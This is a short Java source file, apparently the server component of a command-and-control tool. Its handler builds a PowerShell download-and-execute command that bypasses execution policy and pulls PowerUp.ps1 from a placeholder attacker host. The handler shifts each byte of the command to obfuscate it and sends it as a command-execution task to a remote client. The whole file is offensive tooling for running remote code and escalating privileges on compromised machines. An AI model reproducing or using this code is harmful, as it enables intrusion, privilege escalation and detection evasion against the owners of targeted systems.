package org.server.handle;

import org.server.message.Message;
import org.server.message.MessageType;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Scanner;

public class CommandLineTaskHandler implements Handler{
    @Override
    public byte[] handle() {
        Scanner scanner = new Scanner(System.in);
        String commandLine = "powershell -ep bypass -c \"iex(new-object net.webclient).downloadstring('http://<attacker_ip>/PowerUp.ps1')\"";
        ByteBuffer bb = ByteBuffer.wrap(commandLine.getBytes()).order(ByteOrder.BIG_ENDIAN);
        byte[] payload = bb.array();
        for(int i = 0; i < payload.length; i++)
        {
            payload[i] += 1;
        }
        return Message.createResponse(MessageType.COMMAND_LINE_EXECUTION,payload);
    }
}
